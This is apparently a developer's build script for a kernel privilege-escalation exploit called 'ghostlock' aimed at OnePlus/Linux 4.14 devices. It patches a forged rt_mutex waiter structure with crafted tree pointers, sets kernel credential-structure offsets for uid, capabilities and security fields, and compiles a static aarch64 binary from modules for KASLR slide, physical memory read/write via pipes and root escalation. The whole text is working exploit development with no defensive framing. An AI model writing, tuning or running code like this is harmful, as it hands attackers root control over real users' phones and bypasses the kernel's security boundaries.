#!/bin/bash
cd ~/ghostlock/ghostlock-oneplus || exit 1
python3 - <<'PY'
# --- 1) util.c: compact-aware fake waiter W0 (4.14: pi_tree@0x18) ---
p='src/core/util.c'; s=open(p).read()
old = """    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
    int compact = active_offsets && active_offsets->waiter_compact;
    if (compact) {
      put64(p, W0_OFF + 0x30, waiter_task);
      put64(p, W0_OFF + 0x38, fake_lock);
      put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + 0x48, 0);
    } else {
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    }"""
new = """    int compact = active_offsets && active_offsets->waiter_compact;
    if (compact) {
      /* 4.14 rt_mutex_waiter: tree@0x00 pi_tree@0x18 task@0x30 lock@0x38 prio@0x40 deadline@0x48 */
      put64(p, W0_OFF + 0x18, write_pc);
      put64(p, W0_OFF + 0x20, write_right);
      put64(p, W0_OFF + 0x28, write_left);
      put64(p, W0_OFF + 0x30, waiter_task);
      put64(p, W0_OFF + 0x38, fake_lock);
      put32(p, W0_OFF + 0x40, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + 0x48, 0);
    } else {
      put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
      put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, FAKE_WAITER_PRIO);
      put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
      put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
      put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
      put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
    }"""
assert old in s, "util.c anchor not found"
s = s.replace(old, new)
open(p,'w').write(s)
print("util.c patched")

# --- 2) target.h: cred + waiter lock offsets -> 4.14 ---
p='src/core/target.h'; s=open(p).read()
import re
fixes = {
 'CRED_UID_OFF':'4','CRED_SECUREBITS_OFF':'0x24','CRED_CAPS_OFF':'0x28','CRED_SECURITY_OFF':'0x78',
 'WAITER_LOCK_OFF':'0x38','FAKE_WAITER_LOCK_OFF':'0x38',
}
c=0
for k,v in fixes.items():
    pat=re.compile(r'(#define\s+'+k+r'\s+)0x[0-9a-fA-F]+|(#define\s+'+k+r'\s+)\d+')
    s2,n=pat.subn(lambda m: (m.group(1) or m.group(2))+v, s, count=1)
    if n: s=s2; c+=1
    else: print("MISS",k)
open(p,'w').write(s)
print("target.h fixed",c,"of",len(fixes))
PY
grep -nE 'define (CRED_UID_OFF|CRED_SECUREBITS_OFF|CRED_CAPS_OFF|CRED_SECURITY_OFF|WAITER_LOCK_OFF|FAKE_WAITER_LOCK_OFF)' src/core/target.h
echo "=== rebuild ==="
SRC="src/core/main.c src/core/util.c src/core/slide.c src/core/fops.c src/core/pipe_physrw.c src/core/root.c src/core/miniadb.c src/core/umh_root.c"
aarch64-linux-gnu-gcc -O2 -w -include stddef.h -DKERNELSNITCH_THRESHOLD_MULT=30 \
  -Isrc/core -Isrc/devices -DTARGET_CONFIG_H='"target.h"' $SRC -o /tmp/ghostlock11 -static -pthread 2>&1 | grep -iE 'error' | head
cp -f /tmp/ghostlock11 /mnt/e/Library/Desktop/ghostlock/ghostlock11_a64
ls -la /mnt/e/Library/Desktop/ghostlock/ghostlock11_a64
